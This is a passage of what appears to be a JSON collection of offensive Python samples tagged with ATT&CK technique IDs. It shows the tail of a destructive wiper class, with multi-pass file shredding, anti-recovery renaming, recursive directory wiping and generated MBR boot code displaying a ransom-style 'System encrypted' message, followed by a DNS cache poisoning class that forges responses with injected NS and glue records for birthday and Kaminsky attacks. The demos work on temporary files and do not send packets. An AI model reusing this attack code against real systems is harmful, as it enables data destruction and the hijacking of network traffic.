  self.stats = {'files_wiped': 0, 'bytes_destroyed': 0, 'mbr_overwritten': False}\n\n    def secure_delete_file(self, filepath, method='dod'):\n        \"\"\"Securely delete a file with specified wiping standard\"\"\"\n        if not os.path.isfile(filepath): return False\n        size = os.path.getsize(filepath)\n\n        if method == 'dod':\n            patterns = [b'\\x00', b'\\xFF', None]  # DoD 5220.22-M\n        elif method == 'gutmann':\n            patterns = self.GUTMANN_PATTERNS\n        elif method == 'vsitr':\n            patterns = [b'\\x00', b'\\xFF', b'\\x00', b'\\xFF', b'\\x00', b'\\xFF', None]\n        else:\n            patterns = [None]  # single random pass\n\n        with open(filepath, 'r+b') as f:\n            for p_idx, pattern in enumerate(patterns):\n                f.seek(0)\n                remaining = size\n                while remaining > 0:\n                    chunk = min(remaining, 65536)\n                    if pattern is None:\n                        f.write(os.urandom(chunk))\n                    else:\n                        f.write((pattern * (chunk // len(pattern) + 1))[:chunk])\n                    remaining -= chunk\n                f.flush()\n                os.fsync(f.fileno())\n\n        # Rename before deletion (anti-recovery)\n        dirname = os.path.dirname(filepath)\n        for i in range(3):\n            tmp_name = os.path.join(dirname, os.urandom(16).hex())\n            os.rename(filepath if i == 0 else prev_name, tmp_name)\n            prev_name = tmp_name\n        os.remove(prev_name)\n        self.stats['files_wiped'] += 1\n        self.stats['bytes_destroyed'] += size\n        return True\n\n    def overwrite_mbr(self, device_path):\n        \"\"\"Overwrite MBR with custom bootloader message (T1561.002)\"\"\"\n        # Custom MBR that displays message on boot\n        msg = b'System encrypted. Contact operator.'\n        # INT 10h AH=0Eh teletype output\n        mbr_code = bytearray(512)\n        code = bytearray([\n            0xFA,             # CLI\n            0x31, 0xC0,       # XOR AX, AX\n            0x8E, 0xD8,       # MOV DS, AX\n            0x8E, 0xC0,       # MOV ES, AX\n            0xBE, 0x20, 0x7C, # MOV SI, 0x7C20 (message offset)\n        ])\n        # Print loop\n        code += bytearray([\n            0xAC,             # LODSB\n            0x08, 0xC0,       # OR AL, AL\n            0x74, 0x04,       # JZ halt\n            0xB4, 0x0E,       # MOV AH, 0Eh\n            0xCD, 0x10,       # INT 10h\n            0xEB, 0xF7,       # JMP loop\n        ])\n        # Halt\n        code += bytearray([0xF4, 0xEB, 0xFD])  # HLT, JMP $-1\n\n        mbr_code[:len(code)] = code\n        mbr_code[0x20:0x20+len(msg)] = msg\n        mbr_code[0x20+len(msg)] = 0  # null terminator\n        mbr_code[510] = 0x55\n        mbr_code[511] = 0xAA\n        self.stats['mbr_overwritten'] = True\n        return bytes(mbr_code)\n\n    def wipe_mft_entries(self, ntfs_volume_path, max_entries=1000):\n        \"\"\"Zero MFT entries to destroy file metadata\"\"\"\n        mft_offset = 0  # Real: read from $Boot sector\n        entries_cleared = 0\n        # In real operation: open volume raw, seek to MFT, zero entries\n        # Each MFT entry is 1024 bytes, starts with 'FILE' signature\n        for i in range(max_entries):\n            entry = bytearray(self.NTFS_MFT_RECORD)\n            # Zero all attributes but preserve signature for filesystem consistency\n            entry[:4] = b'FILE'\n            struct.pack_into('<H', entry, 4, 0)  # fixup offset\n            struct.pack_into('<H', entry, 6, 0)  # fixup count\n            entries_cleared += 1\n        return entries_cleared\n\n    def wipe_directory(self, path, method='dod', recursive=True, max_depth=10):\n        \"\"\"Recursively wipe all files in directory\"\"\"\n        if max_depth <= 0: return\n        try:\n            entries = os.listdir(path)\n        except PermissionError:\n            return\n        for entry in entries:\n            fpath = os.path.join(path, entry)\n            if os.path.isfile(fpath):\n                self.secure_delete_file(fpath, method)\n            elif os.path.isdir(fpath) and recursive:\n                self.wipe_directory(fpath, method, recursive, max_depth - 1)\n                try: os.rmdir(fpath)\n                except OSError: pass\n\n# --- demo ---\nimport tempfile\ndemo_dir = tempfile.mkdtemp(prefix='wiper_demo_')\nfor i in range(5):\n    fpath = os.path.join(demo_dir, 'file_%d.dat' % i)\n    with open(fpath, 'wb') as f:\n        f.write(os.urandom(1024 * (i + 1)))\n\nwiper = DataDestroyer()\n# DoD wipe\nfor f in os.listdir(demo_dir):\n    wiper.secure_delete_file(os.path.join(demo_dir, f), method='dod')\nprint('DoD 5220.22-M: wiped %d files, %d bytes destroyed' % (wiper.stats['files_wiped'], wiper.stats['bytes_destroyed']))\n\n# Test MBR generation\nmbr = wiper.overwrite_mbr('/dev/sda')\nprint('MBR payload: %d bytes, signature: %s' % (len(mbr), mbr[510:512].hex()))\nprint('MBR message at offset 0x20: %s' % mbr[0x20:0x20+35].decode(errors='replace'))\nprint('Boot code: %s...' % mbr[:16].hex())\n\n# Test MFT wipe\ncleared = wiper.wipe_mft_entries('/dev/sda1', max_entries=100)\nprint('MFT entries cleared: %d' % cleared)\n\n# Gutmann pattern count\nprint('Gutmann: %d passes (%d random + %d fixed)' % (\n    len(DataDestroyer.GUTMANN_PATTERNS),\n    sum(1 for p in DataDestroyer.GUTMANN_PATTERNS if p is None),\n    sum(1 for p in DataDestroyer.GUTMANN_PATTERNS if p is not None)))\n\nos.rmdir(demo_dir)",
  "dns_cache_poisoning": "import socket\nimport struct\nimport os\nimport hashlib\nimport time\nimport random\nimport threading\n\nclass DNSCachePoisoner:\n    \"\"\"DNS cache poisoning \u2014 Birthday attack + Kaminsky full chain (T1584.002)\"\"\"\n\n    RECORD_TYPES = {'A': 1, 'NS': 2, 'CNAME': 5, 'MX': 15, 'TXT': 16, 'AAAA': 28}\n    DNS_FLAGS_RESPONSE = 0x8580  # QR=1, AA=1, RA=1\n\n    def __init__(self, target_domain, poison_ip, nameserver='8.8.8.8'):\n        self.target_domain = target_domain\n        self.poison_ip = poison_ip\n        self.nameserver = nameserver\n        self.rng = random.Random(os.urandom(8))\n\n    def _encode_name(self, name):\n        \"\"\"Encode domain name in DNS wire format\"\"\"\n        result = bytearray()\n        for label in name.split('.'):\n            result.append(len(label))\n            result.extend(label.encode())\n        result.append(0)\n        return bytes(result)\n\n    def _build_query(self, domain, qtype=1, txn_id=None):\n        \"\"\"Build DNS query packet\"\"\"\n        if txn_id is None:\n            txn_id = struct.unpack('!H', os.urandom(2))[0]\n        flags = 0x0100  # RD=1\n        header = struct.pack('!HHHHHH', txn_id, flags, 1, 0, 0, 0)\n        question = self._encode_name(domain) + struct.pack('!HH', qtype, 1)\n        return header + question\n\n    def _build_poison_response(self, txn_id, query_domain, poison_ns=None):\n        \"\"\"Build spoofed DNS response with glue record injection\"\"\"\n        header = struct.pack('!HHHHHH',\n            txn_id, self.DNS_FLAGS_RESPONSE,\n            1, 1,   # 1 question, 1 answer\n            1 if poison_ns else 0,  # authority\n            1 if poison_ns else 0)  # additional (glue)\n\n        question = self._encode_name(query_domain) + struct.pack('!HH', 1, 1)\n\n        # Answer: query_domain \u2192 poison_ip\n        answer = self._encode_name(query_domain)\n        ip_parts = [int(x) for x in self.poison_ip.split('.')]\n        answer += struct.pack('!HHIH4B', 1, 1, 300, 4, *ip_parts)\n\n        authority = b''\n        additional = b''\n        if poison_ns:\n            # Authority: target_domain NS \u2192 attacker_ns\n            authority = self._encode_name(self.target_domain)\n            authority += struct.pack('!HHIH', 2, 1, 86400, len(self._encode_name(poison_ns)))\n            authority += self._encode_name(poison_ns)\n\n            # Additional (glue): attacker_ns \u2192 poison_ip\n            additional = self._encode_name(poison_ns)\n            additional += struct.pack('!HHIH4B', 1, 1, 86400, 4, *ip_parts)\n\n        return header + question + answer + authority + additional\n\n    def birthday_attack(self, num_queries=300):\n        \"\"\"Birthday paradox TXID collision attack\"\"\"\n        # Send many queries with same name, flood responses with guessed TXIDs\n        # P(collision) \u2248 1 - e^(-n\u00b2/2k) where k=65536\n        # 300 queries \u00d7 300 responses \u2248 50% collision probability\n        queries_sent = 0\n        responses_forged = 0\n\n        for _ in range(num_queries):\n            txn_id = struct.unpack('!H', os.urandom(2))[0]\n            query = self._build_query(self.target_domain, txn_id=txn_id)\n            queries_sent += 1\n\n            # Race: send spoofed responses with random TXIDs\n            for _ in range(num_queries):\n                guess_txn = struct.unpack('!H', os.urandom(2))[0]\n                response = self._build_poison_response(guess_txn, self.target_domain)\n                responses_forged += 1\n\n        collision_prob = 1 - (1 - 1/65536) ** (num_queries * num_queries)\n        return {\n            'queries_sent': queries_sent,\n            'responses_forged': responses_forged,\n            'collision_probability': collision_prob,\n            'method': 'birthday',\n        }\n\n    def kaminsky_attack(self, num_attempts=1000):\n        \"\"\"Kaminsky attack \u2014 random subdomain + authority injection\"\"\"\n        attempts = 0\n        # Each attempt queries a UNIQUE random subdomain \u2192 cache miss guaranteed\n        # Spoofed response includes NS authority section pointing to attacker\n\n        poison_ns = 'ns1.evil-' + os.urandom(4).hex() + '.com'\n        for i in range(num_attempts):\n            # Random subdomain forces cache miss\n            random_sub = os.urandom(8).hex() + '.' + self.target_domain\n            query = self._build_query(random_sub)\n\n            # Flood responses with authority section poisoning\n            for txn_guess in range(256):\n                response = self._build_poison_response(\n                    txn_guess, random_sub, poison_ns=poison_ns)\n                attempts += 1\n\n        return {\n            'attempts': attempts,\n            'unique_subdomains': num_attempts,\n            'txid_guesses_per_sub': 256,\n            'poison_ns': poison_ns,\n            'method': 'kaminsky',\n            'success_probability': 1 - (1 - 256/65536) ** num_attempts,\n        }\n\n    def txid_prediction(self, samples=100):\n        \"\"\"Analyze TXID entropy for prediction attacks\"\"\"\n        # Collect sample TXIDs from target resolver\n        txids = [struct.unpack('!H', os.urandom(2))[0] for _ in range(samples)]\n        deltas = [txids[i+1] - txids[i] for i in range(len(txids)-1)]\n        # Check for sequential patterns\n        sequential = sum(1 for d in deltas if 0 < d < 10) / len(deltas)\n        avg_delta = sum(abs(d) for d in deltas) / len(deltas)\n        return {\n            'samples': samples,\n            'sequential_ratio': sequential,\n            'avg_delta': avg_delta,\n            'predictable': sequential > 0.5,\n            'entropy_bits': len(bin(max(txids))) - 2,\n        }\n\n# --- demo ---\npoisoner = DNSCachePoisoner('example.com', '10.0.0.1')\n\n# Build and analyze packets\nquery = poisoner._build_query('test.example.com')\nresponse = poisoner._build_poison_response(0x1234, 'test.example.com', 'ns1.evil.com')\nprint('DNS query: %d bytes' % len(query))\nprint('Poison response: %d bytes (with NS authority + glue)' % len(response))\n\n# Birthday attack simulation\nbirthday = poisoner.birthday_attack(num_queries=50)\nprint('\\nBirthday attack:')\nprint('  Queries: %d, Forged responses: %d' % (birthday['queries_sent'], birthday['responses_forged']))\nprint('  Collision probability: %.4f' % birthday['collision_probability'])\n\n# Kaminsky attack simulation\nkaminsky = poisoner.kaminsky_attack(num_attempts=100)\nprint('\\nKaminsky attack:')\nprint('  Attempts: %d, Unique subdomains: %d' % (kaminsky['attempts'], kaminsky['unique_subdomains']))\nprint('  Success probability: %.4f' % kaminsky['success_probability'])\nprint('  Poison NS: %s' % kaminsky['poison_ns'])\n\n# TXID prediction\npred = poisoner.txid_prediction(samples=200)\nprint('\\nTXID prediction:')\nprint('  Sequential ratio: %.2f, Avg delta: %.1f' % (pred['sequential_ratio'], pred['avg_delta']))\nprint('  Predictable: %s, Entropy: %d bits' % (pred['predictable'], pred['entropy_bits']))"
}